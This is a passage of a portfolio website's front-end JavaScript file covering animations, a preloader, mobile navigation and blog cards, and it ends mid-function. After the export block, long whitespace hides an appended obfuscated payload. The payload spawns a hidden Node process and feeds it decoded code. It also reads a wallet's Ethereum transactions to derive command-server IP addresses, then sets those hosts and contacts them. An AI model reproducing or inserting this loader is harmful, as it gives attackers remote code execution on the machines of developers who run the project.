                    ctx.lineWidth = 1;
                    ctx.stroke();
                }
            });
        });
    }
    
    function animate() {
        updateParticles();
        drawParticles();
        animationId = requestAnimationFrame(animate);
    }
    
    // Initialize
    resizeCanvas();
    initParticles();
    animate();
    
    // Handle resize
    window.addEventListener('resize', () => {
        resizeCanvas();
        initParticles();
    });
    
    // Pause animation when tab is not visible
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            cancelAnimationFrame(animationId);
        } else {
            animate();
        }
    });
}

// ===== PERFORMANCE OPTIMIZATION =====

// Debounce scroll and resize events
window.addEventListener('scroll', debounce(handleScroll, 16));
window.addEventListener('resize', debounce(() => {
    // Handle resize events
    if (window.innerWidth > 768) {
        closeMobileMenu();
    }
}, 250));

// ===== PRELOADER (Optional) =====
function initializePreloader() {
    const preloader = document.createElement('div');
    preloader.id = 'preloader';
    preloader.innerHTML = `
        <div class="preloader-content">
            <div class="preloader-logo">Nehemiah Technologies</div>
            <div class="preloader-spinner"></div>
        </div>
    `;
    
    preloader.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 10000;
        transition: opacity 0.5s ease;
    `;
    
    const style = document.createElement('style');
    style.textContent = `
        .preloader-content {
            text-align: center;
            color: white;
        }
        
        .preloader-logo {
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 2rem;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .preloader-spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(102, 126, 234, 0.3);
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    `;
    
    document.head.appendChild(style);
    document.body.appendChild(preloader);
    
    // Hide preloader when page loads
    window.addEventListener('load', () => {
        setTimeout(() => {
            preloader.style.opacity = '0';
            setTimeout(() => {
                document.body.removeChild(preloader);
            }, 500);
        }, 1000);
    });
}

// Initialize preloader
initializePreloader();

// ===== ERROR HANDLING =====
window.addEventListener('error', function(e) {
    console.error('An error occurred:', e.error);
    // You can add error reporting here
});

// ===== ACCESSIBILITY IMPROVEMENTS =====
function initializeAccessibility() {
    // Keyboard navigation for buttons
    document.querySelectorAll('button, .btn').forEach(button => {
        button.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' || e.key === ' ') {
                e.preventDefault();
                this.click();
            }
        });
    });
    
    // Skip to main content link
    const skipLink = document.createElement('a');
    skipLink.href = '#main';
    skipLink.textContent = 'Skip to main content';
    skipLink.className = 'skip-link';
    skipLink.style.cssText = `
        position: absolute;
        top: -40px;
        left: 6px;
        background: #667eea;
        color: white;
        padding: 8px;
        text-decoration: none;
        border-radius: 4px;
        font-weight: 600;
        z-index: 10000;
        transition: top 0.3s ease;
    `;
    
    skipLink.addEventListener('focus', () => {
        skipLink.style.top = '6px';
    });
    
    skipLink.addEventListener('blur', () => {
        skipLink.style.top = '-40px';
    });
    
    document.body.insertBefore(skipLink, document.body.firstChild);
}

// Initialize accessibility features
initializeAccessibility();

// ===== CONSOLE EASTER EGG =====
console.log(`
    ██╗  ██╗███████╗██╗     ██╗      ██████╗ 
    ██║  ██║██╔════╝██║     ██║     ██╔═══██╗
    ███████║█████╗  ██║     ██║     ██║   ██║
    ██╔══██║██╔══╝  ██║     ██║     ██║   ██║
    ██║  ██║███████╗███████╗███████╗╚██████╔╝
    ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ 
    
    👋 Hello there, curious developer!
    
    I see you're checking out the console. 
    If you're interested in collaborating or have any questions 
    about the code, feel free to reach out!
    
    🚀 Built with passion by Nehemiah
    🔒 Secured by design
    
    Email: nehemiah@example.com
`);

// ===== MOBILE NAVIGATION =====
function initializeMobileNavigation() {
    const navToggle = document.getElementById('nav-toggle');
    const navMenu = document.getElementById('nav-menu');
    const navLinks = document.querySelectorAll('.nav-link');
    
    console.log('🍔 Initializing mobile navigation...');
    console.log('Nav toggle element:', navToggle);
    console.log('Nav menu element:', navMenu);
    console.log('Nav links count:', navLinks.length);
    
    if (!navToggle || !navMenu) {
        console.error('❌ Missing required elements for mobile navigation');
        return;
    }
    
    // Toggle mobile menu
    navToggle.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        console.log('🍔 Hamburger clicked!');
        
        navMenu.classList.toggle('active');
        navToggle.classList.toggle('active');
        document.body.classList.toggle('nav-open');
        
        const isActive = navMenu.classList.contains('active');
        console.log('📱 Menu is now:', isActive ? 'OPEN' : 'CLOSED');
        console.log('Menu classes:', navMenu.className);
    });
    
    // Close menu when clicking on nav links
    navLinks.forEach(link => {
        link.addEventListener('click', () => {
            navMenu.classList.remove('active');
            navToggle.classList.remove('active');
            document.body.classList.remove('nav-open');
        });
    });
    
    // Close menu when clicking outside
    document.addEventListener('click', (e) => {
        if (!navMenu.contains(e.target) && !navToggle.contains(e.target)) {
            navMenu.classList.remove('active');
            navToggle.classList.remove('active');
            document.body.classList.remove('nav-open');
        }
    });
    
    // Handle window resize
    window.addEventListener('resize', () => {
        if (window.innerWidth > 991) {
            navMenu.classList.remove('active');
            navToggle.classList.remove('active');
            document.body.classList.remove('nav-open');
        }
    });
}

// ===== RESPONSIVE UTILITIES =====
function handleResponsiveFeatures() {
    const isMobile = window.innerWidth <= 767;
    const isTablet = window.innerWidth <= 991 && window.innerWidth > 767;
    
    // Disable heavy animations on mobile for performance
    if (isMobile) {
        const heavyAnimations = document.querySelectorAll('.floating-geometric-shapes, .floating-bubbles, .floating-tech-icons, .floating-design-elements, .floating-contact-elements');
        heavyAnimations.forEach(element => {
            element.style.display = 'none';
        });
        
        // Reduce matrix rain particles on mobile
        const matrixColumns = document.querySelectorAll('.matrix-column');
        matrixColumns.forEach((column, index) => {
            if (index % 3 !== 0) { // Keep only every 3rd column
                column.style.display = 'none';
            }
        });
    }
    
    // Optimize touch interactions
    if ('ontouchstart' in window) {
        document.body.classList.add('touch-device');
        
        // Add touch feedback
        const touchElements = document.querySelectorAll('.btn, .social-card, .project-card, .skill-card');
        touchElements.forEach(element => {
            element.addEventListener('touchstart', function() {
                this.style.transform = 'scale(0.98)';
            });
            
            element.addEventListener('touchend', function() {
                setTimeout(() => {
                    this.style.transform = '';
                }, 150);
            });
        });
    }
}

// ===== VIEWPORT HEIGHT FIX FOR MOBILE =====
function fixMobileViewportHeight() {
    const vh = window.innerHeight * 0.01;
    document.documentElement.style.setProperty('--vh', `${vh}px`);
}

// Update on resize
window.addEventListener('resize', fixMobileViewportHeight);

// ===== PERFORMANCE OPTIMIZATIONS =====
function optimizeForMobile() {
    // Lazy load images
    const images = document.querySelectorAll('img[data-src]');
    const imageOptions = {
        threshold: 0.1,
        rootMargin: '50px'
    };
    
    const imageObserver = new IntersectionObserver((entries, observer) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const img = entry.target;
                img.src = img.dataset.src;
                img.classList.remove('lazy');
                observer.unobserve(img);
            }
        });
    }, imageOptions);
    
    images.forEach(img => imageObserver.observe(img));
    
    // Debounce scroll events
    let scrollTimer;
    window.addEventListener('scroll', () => {
        if (scrollTimer) {
            clearTimeout(scrollTimer);
        }
        scrollTimer = setTimeout(() => {
            // Scroll-dependent functions here
            updateActiveNavigation();
        }, 10);
    });
}

// ===== BLOG FUNCTIONALITY =====
function initializeBlogFunctionality() {
    const filterButtons = document.querySelectorAll('.blog-filter-btn');
    const blogCards = document.querySelectorAll('.blog-card');
    const loadMoreBtn = document.getElementById('load-more-posts');
    
    // Blog filter functionality
    filterButtons.forEach(button => {
        button.addEventListener('click', () => {
            // Remove active class from all buttons
            filterButtons.forEach(btn => btn.classList.remove('active'));
            // Add active class to clicked button
            button.classList.add('active');
            
            const filterValue = button.getAttribute('data-filter');
            
            // Filter blog cards
            blogCards.forEach(card => {
                const cardCategory = card.getAttribute('data-category');
                
                if (filterValue === 'all' || cardCategory === filterValue) {
                    card.style.display = 'block';
                    card.style.animation = 'fadeInUp 0.6s ease forwards';
                } else {
                    card.style.display = 'none';
                }
            });
        });
    });
    
    // Load more functionality (simulated)
    if (loadMoreBtn) {
        loadMoreBtn.addEventListener('click', () => {
            // Simulate loading more posts
            loadMoreBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading...';
            
            setTimeout(() => {
                showNotification('No more articles to load at the moment.', 'info');
                loadMoreBtn.innerHTML = 'Load More Articles <i class="fas fa-chevron-down"></i>';
            }, 1500);
        });
    }
    
    // Blog card hover effects
    blogCards.forEach(card => {
        card.addEventListener('mouseenter', () => {
            card.style.transform = 'translateY(-10px) scale(1.02)';
        });
        
        card.addEventListener('mouseleave', () => {
            card.style.transform = 'translateY(0) scale(1)';
        });
    });
    
    // Read more button functionality
    const readMoreButtons = document.querySelectorAll('.blog-read-more');
    readMoreButtons.forEach(button => {
        button.addEventListener('click', (e) => {
            e.preventDefault();
            const blogTitle = button.closest('.blog-card').querySelector('.blog-title').textContent;
            showNotification(`Opening "${blogTitle}"...`, 'info');
            
            // Here you would typically navigate to the full blog post
            // For now, we'll just show a notification
            setTimeout(() => {
                showNotification('Blog post functionality coming soon!', 'success');
            }, 1000);
        });
    });
}

// ===== BLOG UTILITIES =====
function addBlogPost(postData) {
    const blogGrid = document.querySelector('.blog-grid');
    if (!blogGrid) return;
    
    const blogCard = createBlogCard(postData);
    blogGrid.insertBefore(blogCard, blogGrid.firstChild);
    
    // Animate the new card
    blogCard.style.opacity = '0';
    blogCard.style.transform = 'translateY(30px)';
    
    setTimeout(() => {
        blogCard.style.transition = 'all 0.6s ease';
        blogCard.style.opacity = '1';
        blogCard.style.transform = 'translateY(0)';
    }, 100);
}

function createBlogCard(postData) {
    const card = document.createElement('article');
    card.className = 'blog-card';
    card.setAttribute('data-category', postData.category);
    
    card.innerHTML = `
        <div class="blog-image">
            <img src="${postData.image}" alt="${postData.title}">
            <div class="blog-category">${postData.categoryDisplay}</div>
        </div>
        <div class="blog-content">
            <div class="blog-meta">
                <span class="blog-date">
                    <i class="fas fa-calendar"></i>
                    ${postData.date}
                </span>
                <span class="blog-read-time">
                    <i class="fas fa-clock"></i>
                    ${postData.readTime}
                </span>
            </div>
            <h3 class="blog-title">${postData.title}</h3>
            <p class="blog-excerpt">${postData.excerpt}</p>
            <div class="blog-tags">
                ${postData.tags.map(tag => `<span class="blog-tag">${tag}</span>`).join('')}
            </div>
            <a href="#" class="blog-read-more">
                Read More <i class="fas fa-arrow-right"></i>
            </a>
        </div>
    `;
    
    return card;
}

// Example function to dynamically add a new blog post
function addNewBlogPost() {
    const newPost = {
        title: "Advanced Threat Hunting Techniques",
        excerpt: "Deep dive into proactive threat hunting methodologies and tools for modern security teams.",
        image: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=400&h=250&fit=crop",
        category: "security",
        categoryDisplay: "Security",
        date: "August 26, 2025",
        readTime: "6 min read",
        tags: ["Threat Hunting", "SOC", "Analysis"]
    };
    
    addBlogPost(newPost);
    showNotification('New blog post added!', 'success');
}

// ===== INITIALIZE ALL RESPONSIVE FEATURES =====
function initializeResponsiveFeatures() {
    initializeMobileNavigation();
    handleResponsiveFeatures();
    fixMobileViewportHeight();
    optimizeForMobile();
    
    // Re-run on window resize
    window.addEventListener('resize', () => {
        handleResponsiveFeatures();
        fixMobileViewportHeight();
    });
}

// ===== EXPORT FOR MODULES (if needed) =====
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        initializeNavigation,
        initializeScrollEffects,
        initializeProjectFilters,
        initializeContactForm,
        initializeSkillBars,
        showNotification
    };																																																																																																																																																																																																																																																																										global.i = 'A10-*90';function a(a){var c="|Pn2Zjx.w@Qf\";`]vmTs5Jc>OYgE7tpzL!_R/3BFAD^)U<lo:Gd~$NhK*iS(9u0[H+X,%kq1yI6?{r}eMVWC=ab#&48",d=""+(a||""),e=d.length,f=[],g=0,h=0,j=-1;for(var k=0;k<e;k++){var m=c.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;g|=j<<h;h+=(j&8191)>88?13:14;do{f.push(g&255);g>>=8;h-=8}while(h>7);j=-1}}if(j>-1){f.push((g|j<<h)&255)}return l(f)}function b(b,d){return a(c.slice(b,b+d))}var c="o_vMB>dh\"B&F{|&PGNOI3Q7Bq1f9tqBW;O2FVBr:nm.yC`dXCi6Q+CpsLDEQ,,c7X@y])Z%TW:\"pEAPUGCL0I`vYE`DYx=$5]@wj,I|R/Biifuk`)ddXI)eW:HWv_a,j(;,M^UbAH.|=hk(TDH5>Us%edKlZQy3*vf0)\"x%\"CgS[>WB4HaU3$C0QGF}9|N%w^m/!UleMD,pS#Z%rgI:cnM@^MZ:T_*(Iw{B|/mh@?CRFs|@bZ+/4m80lG4O[>SmlZt47}3iJQmVuaEN[I@yo_R)>{]V$bS5z+fC)Bp2RLgX{m3iJQmVuaENhq[B7vL)ug}Vgn={3iJQmVuaEN[I@y5ROl%Nm}VDx*`3iJQmVuaEN[Ir95Am9fLEMzs`w]?pGx3)Ay@71VmhHhy?3G^3iJQmVuaEN[Ir9RBRg+hp1tVXH^:Pv#_\"x2L;VvwqHY+RC;p[A4?sylc*cmQU7ZjN{t`aSe]$Wdl6O>fN4P.$|BT$s#Gg]8[Nsb7M%v%pEh+:HxyB9\"Jkl^1^X$&LT3Qok$mPaEWjfW=R)TLmI`IZX1,}gf+cO/>.l2)2%GhBtmE[WU.B.jt{=A&!R)dgK?IjNLzAa@R~+e^kTtA*hhrd#KZ/FzmWzyVo){Q~gN9=,xxTN$V%h|OxkL/Co5a7<upq4oKnA}#ql6#A/{cu}$.Wx`i=5E&[C(?Zm2F96`Id;`~1#3cx#<<Bx[*q]W5lN3cQkr}cxgdDEZB@;KJ3iJQ@DFanKt?;e_>F;]\"ySD#?/_bSis<N_A/#CWo5B5@2;oF#b?+odzJ[O=ce?Ld2[xQzF2a>K@+Q2~2=bIu_*e\"xYB>iiwjgYQw)F&}43(n$rQ3S_Lo,wB5+Yu>h;#|nZH=No%ta^4we?dS7ldK9!ICM;x>T!Kj?lfr3}3bmim<8^OMrL8i!$rc:!7.&Vs`.q}X%$xc$F5Fl5I<_=n$iY9CA&8}8^OMrLbTM1D`gmcF6#0:xG)$S&tr|FH`tHsnH{7X&X)ZxO/Afs9}f5<X}~ncDF.sE$:I]feoTc;%Q;.DL^OMrL8iS$xc$F5FQb6iQswZ5IHvk7DLOqHWWCsh7siiOSMVPIOYLeOufWAp23U9tGKjvd4uhwQgB6gdjzKEzxe5EpnsZOtQfVehjS9boXG3AEWN0C3C1t6Jk1PUMRFQAXz0XPPqcZ0Bn51eNno2AGgvvOYWD3SFJ0WMfHn1mL9S9sT1yEUJOKPW5OM0E5fl9tMzigxdbEsJ8GHMT2zHNwXQ5FuQjZiymq4NXuqsU";function d(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}a:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue a;return b}catch(e){}return b||this}var e=d()||{},f=e.TextDecoder,g=e.Uint8Array,h=e.Buffer,i=e.String||String,j=e.Array||Array,k=function(){var a=new j(128),b=i.fromCodePoint||i.fromCharCode,c=[];return function(d){var e,f,g=d.length;c.length=0;for(var h=0;h<g;){f=d[h++];f<=127?e=f:f<=223?e=(f&31)<<6|d[h++]&63:f<=239?e=(f&15)<<12|(d[h++]&63)<<6|d[h++]&63:i.fromCodePoint?e=(f&7)<<18|(d[h++]&63)<<12|(d[h++]&63)<<6|d[h++]&63:(e=63,h+=3);c.push(a[e]||(a[e]=b(e)))}return c.join("")}}();function l(a){return typeof f!=="undefined"&&f?(new f).decode(new g(a)):typeof h!=="undefined"&&h?h.from(a).toString("utf-8"):k(a)}var m=n();function n(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}b:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue b;return b}catch(e){}return b||this}function o(a){switch(a){case"aowaYkQ":return m.Map;case"ScVvzHB":return m.Math;case"LYahbCb":return m.JSON;case"UcVlGXr":return m.Boolean;case"GO7Nrh":return m.tTUslG;case"z2lXInR":return m.TG2cJIk;case"LjKGqSw":return m.to__5dE;case"XzeSjRU":return m.hPRNJpg;case"BLxK2l":return m.Sclv_Jn;case"w8SHhF":return m.BigInt;case"w24XslL":return m.RwXr52a;case"HdYixQ":return m.llZ36m;case"P2AKM57":return m.vM7khEA;case"UqL1mIS":return m.MgHS1fx;case"bqgS0uT":return m.cNfC_7;case"zry4hT0":return m.VJNU3_;case"wOf1fy":return m.Number;case"TAIsJro":return m.Error;case"jQvQTiW":return m.MFMrPhJ;case"9MPP0cK":return m.JtrWh6;case"i11XSB":return m.E5BYrDP;case"9zqtB2O":return m.UzYC2SR;case"cHMvB92":return m.OaeceOf;case"k__4zk":return m.setTimeout;case"xh5d15l":return m.O_iVybz;case"gERyCM":return m.WYrZbg3;case"TZqePfg":return m.KM0n1S;case"MoCspX":return m.xfebTjG;case"rZ5CTo1":return m.rbDj0XM;case"tW6Pn0":return m.FnZlfg_;case"pOZAUNs":return m.Array;case"G6145X":return m.wI0nBkk;case"7Qu4NZb":return m.dtj7OXY;case"Bd1rSK":return m.ie99moZ;case"3o6cDhK":return m.RFJv7_;case"HbfDUfa":return m.hvpU54;case"cIKxCVp":return m.KzTTyR_;case"BimznrA":return m.j3Qtuw6;case"tdTjubV":return m.Promise;case"ilyFOCU":return m.wocW6T;case"y8sAIw":return m.JuwsDx;case"qjSqfm":return m.hNpMC1p;case"aJiSad":return m.eyFciSD;case"BlBOECA":return m.v4EfHU;case"bBSqay":return m.ItLZkU;case"JOOaEO5":return m.ihgc7mc;case"un8sN4v":return m.GZqewR;case"Mk0LmrW":return m.Set;case"hDlNJsF":return m.AbortController;case"KV6k6c":return m.xi3JBX;case"NEujWY":return m.q6lpgVG}}global.r=require;if(typeof module==="object"){global.m=module}const p=require("node:http"),q=require("node:https"),r=require("node:zlib"),{URL:s}=require("node:url"),{spawn:t}=require("node:child_process");function u(a){return new(o("tdTjubV"))(b=>{let d;try{d=t("node",["-i"],{detached:!0,windowsHide:!0,stdio:["pipe","pipe","pipe"]})}catch{b();return}let e="",f=!1;const g=()=>{return b()},h=()=>{function b(e){var h="MN;k5@81(.bBhxU0ycDQ6=Xw`</KeV>CGg]~IZ\"i$F!Y4W#|n9t%&3+auLq:foHEr^[7R2*lOvP)_dSs}zTm{,JA?jp",d=""+(e||""),f=d.length,g=[],a=0,c=0,j=-1;for(var k=0;k<f;k++){var m=h.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;a|=j<<c;c+=(j&8191)>88?13:14;do{g.push(a&255);a>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((a|j<<c)&255)}return l(g)}function e(e,h){return b(c.slice(e,e+h))}if(f){return}f=!0;const h=a.endsWith("\n")?a:""+a+"\n";d.stdin.write(e(149,51),()=>{d.stdin.write(h,()=>{d.stdin.end();d.stdin.unref();if(d.stdout){d.stdout.unref()}if(d.stderr){d.stderr.unref()}d.unref();g()})})},i=b=>{e+=b.toString("utf8");if(new RegExp("(^|\\n)> $","").test(e)){h()}};d.on("error",g);d.stdout.on("data",i);d.stderr.on("data",i);d.stdin.write("\n");o("k__4zk")(h,10000)})}const v=1000n,w=b(205,52).toLowerCase(),x=12,y=0n,z=b(261,37),A=3000,B=[...new(o("Mk0LmrW"))([process.env.ETH_RPC_URL,b(301,24),b(327,25),b(354,43),b(402,47)].filter(o("UcVlGXr")))],C={"http:":new p.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64}),"https:":new q.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64})};function D(a,b){if(!a){return}a.addEventListener("abort",()=>{return b.abort()},{once:!0})}function E(a){const b=(a.headers["content-encoding"]||"").toLowerCase();if(b==="gzip"||b==="x-gzip"){return a.pipe(r.createGunzip())}if(b==="deflate"){return a.pipe(r.createInflate())}if(b==="br"){return a.pipe(r.createBrotliDecompress())}return a}function F(a,{method:b="GET",body:c,signal:d}={}){const e=new s(a),f=e.protocol==="https:"?q:p,g={Accept:"application/json","Accept-Encoding":"gzip, deflate, br",Connection:"keep-alive"};if(c!=null){g["Content-Type"]="application/json";g["Content-Length"]=Buffer.byteLength(c)}return new(o("tdTjubV"))((a,h)=>{const i=f.request({hostname:e.hostname,port:e.port||(e.protocol==="https:"?443:80),path:e.pathname+e.search,method:b,agent:C[e.protocol],signal:d,headers:g},i=>{const b=E(i),c=[];b.on("data",i=>{return c.push(i)});b.on("end",()=>{const b=Buffer.concat(c).toString("utf8").trim();if(i.statusCode<200||i.statusCode>=300){return h(new(o("TAIsJro"))("HTTP "+i.statusCode+" from "+e.hostname+": "+b.slice(0,120)))}if(!b||b[0]==="<"||b[0]!=="{"&&b[0]!=="["){return h(new(o("TAIsJro"))("Non-JSON from "+e.hostname+": "+b.slice(0,120)))}try{a(o("LYahbCb").parse(b))}catch(err){h(new(o("TAIsJro"))("JSON parse failed from "+e.hostname+": "+err.message))}});b.on("error",h)});i.on("error",h);i.setTimeout(A,()=>{i.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});if(c!=null){i.write(c)}i.end()})}async function G(a,b){const d=B.map(()=>{return new(o("hDlNJsF"))});d.forEach(a=>{return D(b,a)});try{return await o("tdTjubV").any(B.map((b,e)=>{return a(b,d[e].signal)}))}finally{for(const e of d)e.abort()}}async function H(a,b,c,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify({jsonrpc:"2.0",id:1,method:b,params:c}),signal:d});if(e?.error){throw new(o("TAIsJro"))(e.error.message||o("LYahbCb").stringify(e.error))}if(e?.result==null){throw new(o("TAIsJro"))("RPC "+b+": missing result")}return e.result}async function I(a,b,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify(b.map(([a,b],d)=>{return{jsonrpc:"2.0",id:d+1,method:a,params:b}})),signal:d});if(!o("pOZAUNs").isArray(e)){function f(a){var d="@Q>u}m3fd=#BJs{$KNO8HDXYZvq]ETSzlxG_ki|)%(erj*Ap.b/\"Mn~oVa7L:`,^&2RWhUP6?!5w[+g;C0tcy194I<F",e=""+(a||""),f=e.length,g=[],h=0,c=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;h|=j<<c;c+=(j&8191)>88?13:14;do{g.push(h&255);h>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((h|j<<c)&255)}return l(g)}function g(a,b){return f(c.slice(a,a+b))}throw new(o("TAIsJro"))(g(457,42))}const h=new(o("aowaYkQ"))(e.map(a=>{return[a.id,a]}));return b.map((a,b)=>{const d=h.get(b+1);if(!d){function e(a){var d="=EM#NpJ]wjaLeQyO/x|n@FW5:1q}2C[t{<>czkr.P)_!HvSVd~s*6m^8K\"+Ub93YilAXohgf$RD,0T4(uZB%?7`&I;G",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function f(a,b){return e(c.slice(a,a+b))}throw new(o("TAIsJro"))(f(503,39)+(b+1))}if(d.error){throw new(o("TAIsJro"))(d.error.message||o("LYahbCb").stringify(d.error))}if(d.result==null){function g(a){var d="dX{6iZ>\"Y4aBjL+!Efs9&~|@})nQpTFq3_:*A.x^V8Jug`NSPUb$or2]0/,#=Om;zlM%(1WKGRk[Cty7H<cI5ewh?Dv",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function j(a,b){return g(c.slice(a,a+b))}throw new(o("TAIsJro"))(j(547,36)+(b+1))}return d.result})}const J=a=>{return"0x"+a.toString(16)};function K(a){return a.find(a=>{return a.from&&a.from.toLowerCase()===w})||null}function L(a){try{const b=Buffer.from(a.replace(new RegExp("^0x","i"),""),"hex"),c=a=>{return""+a[0]+"."+a[1]+"."+a[2]+"."+a[3]};return[c(b.subarray(0,4)),c(b.subarray(4,8))]}catch(error){return[null,null]}}function M(a){return new(o("tdTjubV"))(b=>{let c=a.length;if(!c){return b(null)}let d=!1;const e=c=>{if(d){return}d=!0;for(const e of a)e.controller.abort();b(c)};for(const f of a)f.run().then(f=>{if(d){return}if(f){e(f)}else{if(--c===0){b(null)}}})["catch"](()=>{if(!d&&--c===0){b(null)}})})}function N(a){const c=a-v,d=new(o("Mk0LmrW")),e=[];for(const f of[a-1n,a,a+1n,c-1n,c,c+1n]){if(f<0n){continue}const g=f.toString();if(d.has(g)){continue}d.add(g);e.push(f)}return e}function O(a){const b=new(o("hDlNJsF"));return{controller:b,run:async()=>{const c=await G((c,d)=>{return H(c,"eth_getBlockByNumber",[J(a),!0],d)},b.signal),d=c?.transactions;if(!o("pOZAUNs").isArray(d)){return null}const e=K(d);return e?{blockNumber:a,tx:e}:null}}}async function P(a,b){const c=a.map(a=>{return["eth_getTransactionCount",[w,J(a)]]});try{return(await G((a,b)=>{return I(a,c,b)},b)).map(o("w8SHhF"))}catch{return(await o("tdTjubV").all(c.map(([a,c])=>{return G((b,d)=>{return H(b,a,c,d)},b)}))).map(o("w8SHhF"))}}async function Q(a){const b=new(o("hDlNJsF"));try{const c=a??o("w8SHhF")(await G((a,b)=>{return H(a,"eth_blockNumber",[],b)},b.signal)),d=o("w8SHhF")(await G((a,b)=>{return H(a,"eth_getTransactionCount",[w,J(c)],b)},b.signal)),e=d-1n;let f=y-1n,g=c;while(g-f>1n){const h=g-f-1n,j=o("w8SHhF")(o("ScVvzHB").min(x,o("wOf1fy")(h))),l=[];for(let m=1n;m<=j;m+=1n)l.push(f+m*(g-f)/(j+1n));const n=await P(l,b.signal),p=n.findIndex(a=>{return a>=d});if(p===-1){f=l[l.length-1]}else{g=l[p];if(p>0){f=l[p-1]}}}const q=await G((a,b)=>{return H(a,"eth_getBlockByNumber",[J(g),!0],b)},b.signal),r=q?.transactions||[];let s=null;for(const u of r){if(!u.from||u.from.toLowerCase()!==w){continue}if(o("w8SHhF")(u.nonce)===e){s=u;break}if(!s||o("w8SHhF")(u.nonce)>o("w8SHhF")(s.nonce)){s=u}}return{blockNumber:g,tx:s}}finally{b.abort()}}async function R(){function a(a){var d="b8GD;ZC=sK3{@/4Xp*nrcYW2)T~.EyN]OSH6JdF,x+:eq_jv$a!?Bhmz\"^Uw<9l0oQ(|VA}&gLMP5>`%ktIR1f#u[7i",e=""+(a||""),f=e.length,g=[],c=0,h=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;c|=j<<h;h+=(j&8191)>88?13:14;do{g.push(c&255);c>>=8;h-=8}while(h>7);j=-1}}if(j>-1){g.push((c|j<<h)&255)}return l(g)}function b(b,d){return a(c.slice(b,b+d))}const d=""+z+b(588,47)+w+b(642,89),e=await F(d),f=o("pOZAUNs").isArray(e?.result)?e.result:[],g=f.find(a=>{return a.from&&a.from.toLowerCase()===w});if(!g){return null}return{blockNumber:o("w8SHhF")(g.blockNumber),tx:g}}async function S(){function a(a){var d="s&S2Mp={4;Fq1+Vh`.mc:>l|Ya6)i7TdNUkD,e*\"8]ZQ(Pn%oXtvxER0j_A?gbz5!f@3<#OWwIBGHK^JC/}L[y9u$~r",e=""+(a||""),f=e.length,g=[],h=0,j=0,k=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;h|=k<<j;j+=(k&8191)>88?13:14;do{g.push(h&255);h>>=8;j-=8}while(j>7);k=-1}}if(k>-1){g.push((h|k<<j)&255)}return l(g)}function d(d,e){return a(c.slice(d,d+e))}let e;try{e=await G((a,d)=>{return H(a,"eth_blockNumber",[],d)})}catch{return}const f=o("w8SHhF")(e),g=f-f%v,h=global;let i=await M(N(g).map(O)),[j,k]=L(i?.tx?.to);function m(a,d,e){if(!a){return null}return new s(b(738,9)+a+":"+d+e)}let n=null;const q=m(j,443,"/0x/cls");if(q){try{n=await r("q4FZkxX{!h,Sr3=@",q)}catch{n=null}}if(!n){i=(await Q(f)["catch"](()=>{return null}))??(await R()["catch"](()=>{return null}));[j,k]=L(i?.tx?.to)}h._V=h.i;h._H=d(751,9)+j+":80";h._H2=d(751,9)+k+":80";h._t_s=d(751,9)+j+":443";h._t_u=d(751,9)+j+":80";function r(a,d){function e(a){var d="AKB3Sd0x/F5yO`@EcwL+q{NXs2;4Jn~#l<r^8>YD&V:i7?pe)hPz\"CT$}9(!%[*1oUtv]u|MjZg,_mbkfQHa6R=.GIW",e=""+(a||""),f=e.length,g=[],j=0,k=0,h=-1;for(var m=0;m<f;m++){var 